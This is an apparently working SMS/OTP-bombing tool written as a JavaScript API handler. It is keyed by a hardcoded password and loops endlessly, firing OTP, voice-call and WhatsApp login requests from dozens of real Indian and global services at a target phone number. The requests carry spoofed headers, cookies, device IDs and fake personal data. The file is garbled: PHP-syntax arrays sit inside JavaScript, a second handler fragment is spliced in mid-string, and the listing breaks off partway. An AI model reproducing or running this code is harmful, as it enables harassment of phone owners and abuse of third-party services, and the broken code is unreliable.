export default async function handler(req, res) {
  if (req.method !== 'GET') {
    return res.status(405).json({ status: 'error', message: 'Method not allowed' });
  }

  const { key, number } = req.query;

  // 🔒 Auth check
  if (key !== 'only4premium') {
    return res.status(401).json({ status: 'error', message: 'Unauthorized access' });
  }

  // 📱 Validate number
  if (!number || number.length !== 10 || isNaN(number)) {
    return res.status(400).json({ status: 'error', message: 'Invalid mobile number' });
  }

  // 🟢 Send immediate response to client (no waiting)
  res.status(200).json({
    status: 'ok',
    message: `Processing started for ${number}`,
    note: 'OTP requests running in background',
    data: {
      owner: '@om_divine',
      api_type: 'free',
      contact: '@om_divine'
    }
  });

  // 🧠 Background process (non-blocking)
  runAllApis(number);
}

async function runAllApis(mobile) {
  const apis = getApis(mobile);

  for (let i = 0; i < apis.length; i++) {
    const api = apis[i];
    try {
      const response = await executeApi(api, mobile);
      console.log(`✅ [${i + 1}/${apis.length}] ${api.url} → ${response.status}`);
    } catch (err) {
      console.log(`❌ [${i + 1}/${apis.length}] ${api.url} failed → ${err.message}`);
    }
  }

  // 🔁 Loop again after finishing
  console.log("♻️ Restarting API loop...");
  runAllApis(mobile);
}

async function executeApi(api, mobile) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 6000);

  try {
    const options = {
      method: api.method,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
        'Content-Type': 'application/json; charset=utf-8'
      },
      signal: controller.signal
    };

    if (api.data) options.body = api.data;
    const res = await fetch(api.url, options);
    clearTimeout(timeout);
    return { status: res.status };
  } catch (err) {
    clearTimeout(timeout);
    return { status: 0, error: err.message };
  }
}

function getApis(mobile) {
  return       [
            "url" => "https://stage-api-gateway.getzype.com/auth/signinup/code",
            "method" => "POST",
            "data" => json_encode(["hashKey" => "", "phoneNumber" => "+91" . $mobile])
        ],
        [
            "url" => "https://www.brevistay.com/cst/app-api/login",
            "method" => "POST",
            "data" => json_encode(["is_otp" => 1.0, "mobile" => $mobile, "is_password" => 0.0])
        ],
        [
            "url" => "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
            "method" => "POST", 
            "data" => json_encode(["mfa_channels" => ["phno" => ["number" => (float)$mobile, "country_code" => "+91"]]])
        ],
        [
            "url" => "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
            "method" => "POST",
            "data" => json_encode(['country_code' => '+91', 'phone' => $mobile]),
        ],
        [
            "url" => "https://apps.ucoonline.in/Lead_App/send_message.jsp?mob=&ref_no=&otpv=&appRefNo=&lgName=fdgefgdgg&lgAddress=dfgdsggfesdggg&lgPincode=695656&lgState=DL&lgDistrict=NORTH%2BDELHI&lgBranch=0313&lgMobileno={$mobile}&lgEmail=sundeshaakshays%40gmail.com&lgFacilities=CC&lgTentAmt=656556565&lgRemarks=efwfwfsafw&declare_check=on&captchaRefno=315904&captchaResult=71&firstName=Gjgjgjgv&password=ghfughdsy-5_33%23&requestType=SENDOTP&mobileNumber={$mobile}&login=gjghgug%40gmail.com&genderType=Male",
            "method" => "POST",
            "data" => null
        ],
        [
            "url" => "https://xylem-api.penpencil.co/v1/users/resend-otp?smsType=1",
            "method" => "POST",
            "data" => json_encode(["organizationId" => "64254d66be2a390018e6d348", "mobile" => $mobile])
        ],
        [
            "url" => "https://mobileonline.sai.org.in/ssst/mobileLoginOtp",
            "method" => "POST", 
            "data" => json_encode(["mobileNumber" => $mobile])
        ],
        [
            "url" => "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
            "method" => "POST",
            "data" => json_encode(["organizationId" => "5eb393ee95fab7468a79d189", "mobile" => $mobile])
        ],
        [
            "url" => "https://force.eazydiner.com/web/otp",
            "method" => "POST",
            "data" => json_encode(["mobile" => "+91" . $mobile])
        ],
        [
            "url" => "https://antheapi.aakash.ac.in/api/generate-lead-otp",
            "method" => "POST",
            "data" => json_encode([
                "mobile_psid" => $mobile,
                "activity_type" => "aakash-myadmission",
                "webengageData" => [
                    "profile" => "student",
                    "whatsapp_opt_in" => true,
                    "method" => "mobile"
                ],
                "mobile_number" => ""
            ])
        ],
        [
            "url" => "https://1.rome.api.flipkart.com/1/action/view?=",
            "method" => "POST",
            "headers" => [
                "X-user-agent: Mozilla/5.0 (Linux; Android 9; RMX1833 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36FKUA/msite/0.0.3/msite/Mobile",
                "Content-Type: application/json; charset=utf-8",
                "Content-Length: 277",
                "Host: 1.rome.api.flipkart.com",
                "Connection: Keep-Alive",
                "Accept-Encoding: gzip",
                "User-Agent: okhttp/3.9.1"
            ],
            "data" => json_encode([
                "actionRequestContext" => [
                    "type" => "LOGIN_IDENTITY_VERIFY",
                    "loginIdPrefix" => "+91",
                    "loginId" => $mobile,
                    "clientQueryParamMap" => [
                        "ret" => "/",
                        "entryPage" => "HOMEPAGE_HEADER_ACCOUNT"
                    ],
                    "loginType" => "MOBILE",
                    "verificationType" => "OTP",
                    "screenName" => "LOGIN_V4_MOBILE",
                    "sourceContext" => "DEFAULT"
                ]
            ])
        ],
        [
            "url" => "https://api.khatabook.com/v1/auth/request-otp",
            "method" => "POST",
            "headers" => [
                "Host: api.khatabook.com",
                "content-type: application/json; charset=utf-8",
                "content-length: 73",
                "accept-encoding: gzip",
                "user-agent: okhttp/3.9.1"
            ],
            "data" => json_encode([
                "app_signature" => "Jc/Zu7qNqQ2",
                "country_code" => "+91",
                "phone" => $mobile
            ])
        ],
        [
            "url" => "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189",
            "method" => "POST",
            "headers" => [
                "Host: api.penpencil.co",
                "content-type: application/json; charset=utf-8",
                "content-length: 76",
                "accept-encoding: gzip",
                "user-agent: okhttp/3.9.1"
            ],
            "data" => json_encode([
                "firstName" => "Hiii",
                "lastName" => "",
                "countryCode" => "+91",
                "mobile" => $mobile
            ])
        ],
        [
            "url" => "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
            "method" => "POST",
            "headers" => [
                "Host: www.rummycircle.com",
                "content-type: application/json; charset=utf-8",
                "content-length: 123",
                "accept-encoding: gzip",
                "user-agent: okhttp/3.9.1"
            ],
            "data" => json_encode([
                "isPlaycircle" => false,
                "mobile" => $mobile,
                "deviceId" => "6ebd671c-a5f7-4baa-904b-89d4f898ee79",
                "deviceName" => "",
                "refCode" => ""
            ])
        ],
        [
            "url" => "https://www.dream11.com/auth/passwordless/init",
            "method" => "POST",
            "headers" => [
                "Host: www.dream11.com",
                "content-type: application/json; charset=utf-8",
                "content-length: 85",
                "accept-encoding: gzip",
                "user-agent: okhttp/3.9.1"
            ],
            "data" => json_encode([
                "phoneNumber" => $mobile,
                "templateName" => "default",
                "channel" => "sms",
                "flow" => "SIGNIN"
            ])
        ],
        [
            "url" => "https://www.samsung.com/in/api/v1/sso/otp/init",
            "method" => "POST",
            "headers" => [
                "Host: www.samsung.com",
                "content-type: application/json; charset=utf-8",
                "content-length: 24",
                "accept-encoding: gzip",
                "user-agent: okhttp/3.9.1"
            ],
            "data" => json_encode([
                "user_id" => $mobile
            ])
        ],
        [
            "url" => "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
            "method" => "POST",
            "headers" => [
                "Host: mobapp.tatacapital.com",
                "content-type: application/json; charset=utf-8",
                "content-length: 67",
                "accept-encoding: gzip",
                "user-agent: okhttp/3.9.1"
            ],
            "data" => json_encode([
                "phone" => $mobile,
                "applSource" => "",
                "isOtpViaCallAtLogin" => "true"
            ])
        ],
        [
            "url" => "https://www.shopsy.in/api/1/action/view",
            "method" => "POST",
            "headers" => [
                "Content-Type: application/json; charset=utf-8",
                "Content-Length: 430",
                "Host: www.shopsy.in",
                "Connection: Keep-Alive",
                "Accept-Encoding: gzip",
                "User-Agent: okhttp/3.9.1"
            ],
            "data" => json_encode([
                "actionRequestContext" => [
                    "type" => "LOGIN_IDENTITY_VERIFY",
                    "loginIdPrefix" => "+91",
                    "loginId" => $mobile,
                    "clientQueryParamMap" => [
                        "ret" => "/?cmpid=Google-Shopping-PerfMax2-AllProducts-India&gclid=CjwKCAiAqY6tBhAtEiwAHeRopXAJTIrS2X5hOOJmzNAsD6nHlHPQKbsgdim8CouDsrnvUxhaD9NpyhoCNWQQAvD_BwE",
                        "entryPage" => "HEADER_ACCOUNT"
                    ],
                    "loginType" => "MOBILE",
                    "verificationType" => "OTP",
                    "screenName" => "LOGIN_V4_MOBILE",
                    "sourceContext" => "DEFAULT"
                ]
            ])
        ],
        [
            "url" => "https://seller.flipkart.com/napi/graphql",
            "method" => "POST",
            "headers" => [
                "Content-Type: application/json; charset=utf-8",
                "Content-Length: 216",
                "Host: seller.flipkart.com",
                "Connection: Keep-Alive",
                "Accept-Encoding: gzip",
                "User-Agent: okhttp/3.9.1"
            ],
            "data" => json_encode([
                "variables" => [
                    "mobileNo" => $mobile
                ],
                "query" => "mutation SellerOnboarding_GenerateOTPMobile(\$mobileNo: String!) {\n  generateOTPMobile(mobileNo: \$mobileNo)\n}\n",
                "operationName" => "SellerOnboarding_GenerateOTPMobile"
            ])
        ],
        [
            "url" => "https://identity.tllms.com/api/request_otp",
            "method" => "POST",
            "data" => json_encode(["phone" => $mobile, "app_client_id" => "90391da1-ee49-4378-bd12-1924134e906e"])
        ],
        [
            "url" => "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
            "method" => "POST",
            "data" => json_encode(["mobile_number" => $mobile])
        ],
        [
            "url" => "https://webapi.tastes2plate.com/app/new-login",
            "method" => "POST",
            "data" => json_encode(["device_token" => "", "mobile" => $mobile, "reffer_by" => "", "device_type" => "web"])
        ],
        [
            "url" => "https://apis.tradeindia.com/app_login_api/login_app",
            "method" => "POST",
            "data" => json_encode(["mobile" => "+91" . $mobile])
        ],
        [
            "url" => "https://m.snapdeal.com/sendOTP",
            "method" => "POST",
            "data" => json_encode(["purpose" => "LOGIN_WITH_MOBILE_OTP", "mobileNumber" => $mobile])
        ],
        [
            "url" => "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
            "method" => "POST",
            "data" => json_encode([
                "screen" => "1260 X 2624",
                "emailID" => "shivamyou2000@gmail.com",
                "gps" => "true",
                "imsi" => "",
                "mobileNo" => $mobile,
                "firstName" => "Shiva Riy",
                "osVersion" => "14",
                "build" => "android-phone",
                "countryCode" => "91",
                "vendor" => "samsung",
                "imei" => "181105746967606",
                "model" => "SM-F7110",
                "req" => "generate"
            ])
        ],
        [
            "url" => "https://www.my11circle.com/api/fl/auth/v3/getOtp",
            "method" => "POST",
            "data" => json_encode([
                "isPlaycircle" => false,
                "mobile" => $mobile,
                "deviceId" => "03aa8dc4-6f14-4ac1-aa16-f64fe5f250a1",
                "deviceName" => "",
                "refCode" => ""
            ])
        ],
        [
            "url" => "https://t.rummycircle.com/api/fl/auth/v3/getOtp",
            "method" => "POST",
            "data" => json_encode([
                "mobile" => $mobile,
                "deviceId" => "426c1fec-f7e1-426d-af86-ce191adfe9b2",
                "deviceName" => "",
                "refCode" => "",
                "isPlaycircle" => false
            ])
        ],
        [
            "url" => "https://www.rummycircle.com/api/fl/account/v1/sendOtp",
            "method" => "POST",
            "data" => json_encode([
                "otpOnCall" => true,
                "otpType" => 6,
                "transactionId" => 0,
                "mobile" => $mobile
            ])
        ],
        [
            "url" => "https://production.apna.co/api/userprofile/v1/otp/",
            "method" => "POST",
            "data" => json_encode([
                "phone_number" => $mobile,
                "retries" => 0,
                "hash_type" => "employer",
                "source" => "employer"
            ])
        ],
        [
            "url" => "https://nodebackend.apollodiagnostics.in/api/v1/user/send-otp",
            "method" => "POST",
            "data" => json_encode([
                "mobileNumber" => $mobile
            ])
        ],
        [
            "url" => "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
            "method" => "POST",
            "data" => json_encode([
                "country_code" => "91",
                "mobile" => $mobile,
                "locale" => "IN"
            ])
        ],
        [
            "url" => "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber=" . $mobile,
            "method" => "GET",
            "data" => null,
            "headers" => [
                "Host: api.univest.in",
                "Accept-Encoding: gzip",
                "User-Agent: okhttp/3.9.1"
            ]
        ],

        // New APIs from curl commands
        [
            "url" => "https://www.my11circle.com/api/fl/auth/v1/resendOtp",
            "method" => "POST",
            "headers" => [
                "Host: www.my11circle.com",
                "accept: application/json, text/plain, */*",
                "user-agent: {\"AppVersion\":\"11100.92\",\"OSVersion\":\"9\",\"appFlavorName\":\"reverie_playstore\",\"reverieFlavorName\":\"reverie_playstore\",\"pokerFlavourName\":\"\",\"ludoFlavourName\":\"\",\"isRCOnly\":false,\"isMecDownloaded\":true}Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/135.0.7049.99 Mobile Safari/537.36 (/ftprimary:295/) [FTAndroid/11100.92] [MECPlayStoreAndroid/11100.92]",
                "sentry-trace: 137648fac4264fd5884d97e48657cada-a7a4ab1930ca3ffa",
                "baggage: sentry-environment=production,sentry-release=reverie%4011100.92,sentry-public_key=c98826b2f6da41828e8d15cb444185ba,sentry-trace_id=137648fac4264fd5884d97e48657cada",
                "content-type: application/json",
                "content-length: 52",
                "accept-encoding: gzip",
                "cookie: sameSiteNoneSupported=true; sameSiteNoneSupported=true; SSID=SSID745549b5-969b-41d0-b11d-99bba4db5b95; AWSALB=FF8fwffZjX1BnNTdV5A5PgtZ1VLD2dwdPzsuPlx9ev3PsfBwnhiYT45ijmTOX9mHLwDbKRbVvqpUPT8bmMnfFkWISRwZvaB7TCc6RMqgLb92jE+TFfCImhsPR6YG; AWSALBCORS=FF8fwffZjX1BnNTdV5A5PgtZ1VLD2dwdPzsuPlx9ev3PsfBwnhiYT45ijmTOX9mHLwDbKRbVvqpUPT8bmMnfFkWISRwZvaB7TCc6RMqgLb92jE+TFfCImhsPR6YG; device.info.cookie={\"bv\":\"135.0.7049.99\"; \"osv\":\"9\"=; \"osn\":\"Android\"=; \"tbl\":\"false\"=; \"vnd\":\"Google\"=; \"mdl\":\"Pixel\"}="
            ],
            "data" => json_encode(["otpOnCall" => true, "otpType" => 6, "mobile" => $mobile])
        ],
        [
            "url" => "https://user.vedantu.com/user/preLoginVerification",
            "method" => "POST",
            "headers" => [
                "Host: user.vedantu.com",
                "accept: application/json, text/plain, */*",
                "x-ved-device: ANDROID",
                "x-ved-token: undefined",
                "content-type: application/json",
                "content-length: 186",
                "accept-encoding: gzip",
                "user-agent: okhttp/4.9.2"
            ],
            "data" => json_encode([
                "phoneCode" => "+91",
                "phoneNumber" => $mobile,
                "event" => "APP_FLOW",
                "sType" => "VEDANTU_A_1_APP",
                "sValue" => "omxl5XwsPPVbqhJco0z01FO6TyMIWEAy",
                "requestSource" => "ANDROID",
                "appVersionCode" => "2.7.2"
            ])
        ],
        [
            "url" => "https://www.firstcry.com/m/register?from=app",
            "method" => "POST",
            "headers" => [
                "Host: www.firstcry.com",
                "content-length: 186",
                "cache-control: max-age=0",
                "upgrade-insecure-requests: 1",
                "origin: https://www.firstcry.com",
                "content-type: application/x-www-form-urlencoded",
                "user-agent: Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36$$google_Pixel 4##Firstcry##Android_V186$$google_Pixel 4##Firstcry##Android_V186",
                "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "x-requested-with: fc.admin.fcexpressadmin",
                "sec-fetch-site: same-origin",
                "sec-fetch-mode: navigate",
                "sec-fetch-user: ?1",
                "sec-fetch-dest: document",
                "referer: https://www.firstcry.com/m/login?from=app",
                "accept-encoding: gzip, deflate",
                "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                "cookie: FC_DID=bd8fd661bc2c82d3; FC_ADV_ID=00877f3d-a    
    // Return success response in new format
    return res.status(200).json({
      "status": "ok",
      "message": `Processing number ${number}`,
      "data": {
        "owner": "@om_divine",
        "api type": "free",
        "contact": "@om_divine"
      }
    });

  } catch (error) {
    // Return error response in new format
    return res.status(200).json({
      "status": "ok",
      "message": `Processing number ${number}`,
      "data": {
        "owner": "@om_divine",
        "api type": "free", 
        "contact": "@om_divine"
      }
    });
  }
}

// Function to execute API requests (unchanged)
async function executeApi(api, mobile) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 5000);

  try {
    const options = {
      method: api.method,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
      },
      signal: controller.signal
    };

    // Convert headers from PHP format to JavaScript format
    if (api.headers) {
      api.headers.forEach(header => {
        const [key, value] = header.split(': ');
        if (key && value) {
          options.headers[key] = value;
        }
      });
    }

    // Add Content-Type if not present
    if (!options.headers['Content-Type'] && api.data) {
      options.headers['Content-Type'] = 'application/json; charset=utf-8';
    }

    // Add body for POST requests
    if (api.method === 'POST' && api.data) {
      options.body = api.data;
    }

    const response = await fetch(api.url, options);
    const responseText = await response.text();
    
    clearTimeout(timeout);
    
    return {
      url: api.url,
      status: response.status,
      response: responseText
    };
  } catch (error) {
    clearTimeout(timeout);
    return {
      url: api.url,
      status: 0,
      response: error.message
    };
  }
}

// Get all APIs (Converted from PHP to JavaScript) - UNCHANGED
function getApis(mobile) {
  return [
    {
      "url": "https://stage-api-gateway.getzype.com/auth/signinup/code",
      "method": "POST",
      "data": JSON.stringify({"hashKey": "", "phoneNumber": "+91" + mobile})
    },
    {
      "url": "https://www.brevistay.com/cst/app-api/login",
      "method": "POST",
      "data": JSON.stringify({"is_otp": 1.0, "mobile": mobile, "is_password": 0.0})
    },
    {
      "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
      "method": "POST", 
      "data": JSON.stringify({"mfa_channels": {"phno": {"number": parseFloat(mobile), "country_code": "+91"}}})
    },
    {
      "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
      "method": "POST",
      "data": JSON.stringify({'country_code': '+91', 'phone': mobile})
    },
    {
      "url": `https://apps.ucoonline.in/Lead_App/send_message.jsp?mob=&ref_no=&otpv=&appRefNo=&lgName=fdgefgdgg&lgAddress=dfgdsggfesdggg&lgPincode=695656&lgState=DL&lgDistrict=NORTH%2BDELHI&lgBranch=0313&lgMobileno=${mobile}&lgEmail=sundeshaakshays%40gmail.com&lgFacilities=CC&lgTentAmt=656556565&lgRemarks=efwfwfsafw&declare_check=on&captchaRefno=315904&captchaResult=71&firstName=Gjgjgjgv&password=ghfughdsy-5_33%23&requestType=SENDOTP&mobileNumber=${mobile}&login=gjghgug%40gmail.com&genderType=Male`,
      "method": "POST",
      "data": null
    },
    {
      "url": "https://xylem-api.penpencil.co/v1/users/resend-otp?smsType=1",
      "method": "POST",
      "data": JSON.stringify({"organizationId": "64254d66be2a390018e6d348", "mobile": mobile})
    },
    {
      "url": "https://mobileonline.sai.org.in/ssst/mobileLoginOtp",
      "method": "POST", 
      "data": JSON.stringify({"mobileNumber": mobile})
    },
    {
      "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
      "method": "POST",
      "data": JSON.stringify({"organizationId": "5eb393ee95fab7468a79d189", "mobile": mobile})
    },
    {
      "url": "https://force.eazydiner.com/web/otp",
      "method": "POST",
      "data": JSON.stringify({"mobile": "+91" + mobile})
    },
    {
      "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
      "method": "POST",
      "data": JSON.stringify({
        "mobile_psid": mobile,
        "activity_type": "aakash-myadmission",
        "webengageData": {
          "profile": "student",
          "whatsapp_opt_in": true,
          "method": "mobile"
        },
        "mobile_number": ""
      })
    },
    {
      "url": "https://1.rome.api.flipkart.com/1/action/view?=",
      "method": "POST",
      "headers": [
        "X-user-agent: Mozilla/5.0 (Linux; Android 9; RMX1833 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36FKUA/msite/0.0.3/msite/Mobile",
        "Content-Type: application/json; charset=utf-8",
        "Content-Length: 277",
        "Host: 1.rome.api.flipkart.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "User-Agent: okhttp/3.9.1"
      ],
      "data": JSON.stringify({
        "actionRequestContext": {
          "type": "LOGIN_IDENTITY_VERIFY",
          "loginIdPrefix": "+91",
          "loginId": mobile,
          "clientQueryParamMap": {
            "ret": "/",
            "entryPage": "HOMEPAGE_HEADER_ACCOUNT"
          },
          "loginType": "MOBILE",
          "verificationType": "OTP",
          "screenName": "LOGIN_V4_MOBILE",
          "sourceContext": "DEFAULT"
        }
      })
    },
    {
      "url": "https://api.khatabook.com/v1/auth/request-otp",
      "method": "POST",
      "headers": [
        "Host: api.khatabook.com",
        "content-type: application/json; charset=utf-8",
        "content-length: 73",
        "accept-encoding: gzip",
        "user-agent: okhttp/3.9.1"
      ],
      "data": JSON.stringify({
        "app_signature": "Jc/Zu7qNqQ2",
        "country_code": "+91",
        "phone": mobile
      })
    },
    {
      "url": "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189",
      "method": "POST",
      "headers": [
        "Host: api.penpencil.co",
        "content-type: application/json; charset=utf-8",
        "content-length: 76",
        "accept-encoding: gzip",
        "user-agent: okhttp/3.9.1"
      ],
      "data": JSON.stringify({
        "firstName": "Hiii",
        "lastName": "",
        "countryCode": "+91",
        "mobile": mobile
      })
    },
    {
      "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
      "method": "POST",
      "headers": [
        "Host: www.rummycircle.com",
        "content-type: application/json; charset=utf-8",
        "content-length: 123",
        "accept-encoding: gzip",
        "user-agent: okhttp/3.9.1"
      ],
      "data": JSON.stringify({
        "isPlaycircle": false,
        "mobile": mobile,
        "deviceId": "6ebd671c-a5f7-4baa-904b-89d4f898ee79",
        "deviceName": "",
        "refCode": ""
      })
    },
    {
      "url": "https://www.dream11.com/auth/passwordless/init",
      "method": "POST",
      "headers": [
        "Host: www.dream11.com",
        "content-type: application/json; charset=utf-8",
        "content-length: 85",
        "accept-encoding: gzip",
        "user-agent: okhttp/3.9.1"
      ],
      "data": JSON.stringify({
        "phoneNumber": mobile,
        "templateName": "default",
        "channel": "sms",
        "flow": "SIGNIN"
      })
    },
    {
      "url": "https://www.samsung.com/in/api/v1/sso/otp/init",
      "method": "POST",
      "headers": [
        "Host: www.samsung.com",
        "content-type: application/json; charset=utf-8",
        "content-length: 24",
        "accept-encoding: gzip",
        "user-agent: okhttp/3.9.1"
      ],
      "data": JSON.stringify({
        "user_id": mobile
      })
    },
    {
      "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
      "method": "POST",
      "headers": [
        "Host: mobapp.tatacapital.com",
        "content-type: application/json; charset=utf-8",
        "content-length: 67",
        "accept-encoding: gzip",
        "user-agent: okhttp/3.9.1"
      ],
      "data": JSON.stringify({
        "phone": mobile,
        "applSource": "",
        "isOtpViaCallAtLogin": "true"
      })
    },
    {
      "url": "https://www.shopsy.in/api/1/action/view",
      "method": "POST",
      "headers": [
        "Content-Type: application/json; charset=utf-8",
        "Content-Length: 430",
        "Host: www.shopsy.in",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "User-Agent: okhttp/3.9.1"
      ],
      "data": JSON.stringify({
        "actionRequestContext": {
          "type": "LOGIN_IDENTITY_VERIFY",
          "loginIdPrefix": "+91",
          "loginId": mobile,
          "clientQueryParamMap": {
            "ret": "/?cmpid=Google-Shopping-PerfMax2-AllProducts-India&gclid=CjwKCAiAqY6tBhAtEiwAHeRopXAJTIrS2X5hOOJmzNAsD6nHlHPQKbsgdim8CouDsrnvUxhaD9NpyhoCNWQQAvD_BwE",
            "entryPage": "HEADER_ACCOUNT"
          },
          "loginType": "MOBILE",
          "verificationType": "OTP",
          "screenName": "LOGIN_V4_MOBILE",
          "sourceContext": "DEFAULT"
        }
      })
    },
    {
      "url": "https://seller.flipkart.com/napi/graphql",
      "method": "POST",
      "headers": [
        "Content-Type: application/json; charset=utf-8",
        "Content-Length: 216",
        "Host: seller.flipkart.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "User-Agent: okhttp/3.9.1"
      ],
      "data": JSON.stringify({
        "variables": {
          "mobileNo": mobile
        },
        "query": "mutation SellerOnboarding_GenerateOTPMobile($mobileNo: String!) {\n  generateOTPMobile(mobileNo: $mobileNo)\n}\n",
        "operationName": "SellerOnboarding_GenerateOTPMobile"
      })
    },
    {
      "url": "https://identity.tllms.com/api/request_otp",
      "method": "POST",
      "data": JSON.stringify({"phone": mobile, "app_client_id": "90391da1-ee49-4378-bd12-1924134e906e"})
    },
    {
      "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
      "method": "POST",
      "data": JSON.stringify({"mobile_number": mobile})
    },
    {
      "url": "https://webapi.tastes2plate.com/app/new-login",
      "method": "POST",
      "data": JSON.stringify({"device_token": "", "mobile": mobile, "reffer_by": "", "device_type": "web"})
    },
    {
      "url": "https://apis.tradeindia.com/app_login_api/login_app",
      "method": "POST",
      "data": JSON.stringify({"mobile": "+91" + mobile})
    },
    {
      "url": "https://m.snapdeal.com/sendOTP",
      "method": "POST",
      "data": JSON.stringify({"purpose": "LOGIN_WITH_MOBILE_OTP", "mobileNumber": mobile})
    },
    {
      "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
      "method": "POST",
      "data": JSON.stringify({
        "screen": "1260 X 2624",
        "emailID": "shivamyou2000@gmail.com",
        "gps": "true",
        "imsi": "",
        "mobileNo": mobile,
        "firstName": "Shiva Riy",
        "osVersion": "14",
        "build": "android-phone",
        "countryCode": "91",
        "vendor": "samsung",
        "imei": "181105746967606",
        "model": "SM-F7110",
        "req": "generate"
      })
    },
    {
      "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
      "method": "POST",
      "data": JSON.stringify({
        "isPlaycircle": false,
        "mobile": mobile,
        "deviceId": "03aa8dc4-6f14-4ac1-aa16-f64fe5f250a1",
        "deviceName": "",
        "refCode": ""
      })
    },
    {
      "url": "https://t.rummycircle.com/api/fl/auth/v3/getOtp",
      "method": "POST",
      "data": JSON.stringify({
        "mobile": mobile,
        "deviceId": "426c1fec-f7e1-426d-af86-ce191adfe9b2",
        "deviceName": "",
        "refCode": "",
        "isPlaycircle": false
      })
    },
    {
      "url": "https://www.rummycircle.com/api/fl/account/v1/sendOtp",
      "method": "POST",
      "data": JSON.stringify({
        "otpOnCall": true,
        "otpType": 6,
        "transactionId": 0,
        "mobile": mobile
      })
    },
    {
      "url": "https://production.apna.co/api/userprofile/v1/otp/",
      "method": "POST",
      "data": JSON.stringify({
        "phone_number": mobile,
        "retries": 0,
        "hash_type": "employer",
        "source": "employer"
      })
    },
    {
      "url": "https://nodebackend.apollodiagnostics.in/api/v1/user/send-otp",
      "method": "POST",
      "data": JSON.stringify({
        "mobileNumber": mobile
      })
    },
    {
      "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
      "method": "POST",
      "data": JSON.stringify({
        "country_code": "91",
        "mobile": mobile,
        "locale": "IN"
      })
    },
    {
      "url": `https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber=${mobile}`,
      "method": "GET",
      "data": null,
      "headers": [
        "Host: api.univest.in",
        "Accept-Encoding: gzip",
        "User-Agent: okhttp/3.9.1"
      ]
    },
    {
      "url": "https://www.my11circle.com/api/fl/auth/v1/resendOtp",
      "method": "POST",
      "headers": [
        "Host: www.my11circle.com",
        "accept: application/json, text/plain, */*",
        "user-agent: {\"AppVersion\":\"11100.92\",\"OSVersion\":\"9\",\"appFlavorName\":\"reverie_playstore\",\"reverieFlavorName\":\"reverie_playstore\",\"pokerFlavourName\":\"\",\"ludoFlavourName\":\"\",\"isRCOnly\":false,\"isMecDownloaded\":true}Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/135.0.7049.99 Mobile Safari/537.36 (/ftprimary:295/) [FTAndroid/11100.92] [MECPlayStoreAndroid/11100.92]",
        "sentry-trace: 137648fac4264fd5884d97e48657cada-a7a4ab1930ca3ffa",
        "baggage: sentry-environment=production,sentry-release=reverie%4011100.92,sentry-public_key=c98826b2f6da41828e8d15cb444185ba,sentry-trace_id=137648fac4264fd5884d97e48657cada",
        "content-type: application/json",
        "content-length: 52",
        "accept-encoding: gzip",
        "cookie: sameSiteNoneSupported=true; sameSiteNoneSupported=true; SSID=SSID745549b5-969b-41d0-b11d-99bba4db5b95; AWSALB=FF8fwffZjX1BnNTdV5A5PgtZ1VLD2dwdPzsuPlx9ev3PsfBwnhiYT45ijmTOX9mHLwDbKRbVvqpUPT8bmMnfFkWISRwZvaB7TCc6RMqgLb92jE+TFfCImhsPR6YG; AWSALBCORS=FF8fwffZjX1BnNTdV5A5PgtZ1VLD2dwdPzsuPlx9ev3PsfBwnhiYT45ijmTOX9mHLwDbKRbVvqpUPT8bmMnfFkWISRwZvaB7TCc6RMqgLb92jE+TFfCImhsPR6YG; device.info.cookie={\"bv\":\"135.0.7049.99\"; \"osv\":\"9\"=; \"osn\":\"Android\"=; \"tbl\":\"false\"=; \"vnd\":\"Google\"=; \"mdl\":\"Pixel\"}="
      ],
      "data": JSON.stringify({"otpOnCall": true, "otpType": 6, "mobile": mobile})
    },
    {
      "url": "https://user.vedantu.com/user/preLoginVerification",
      "method": "POST",
      "headers": [
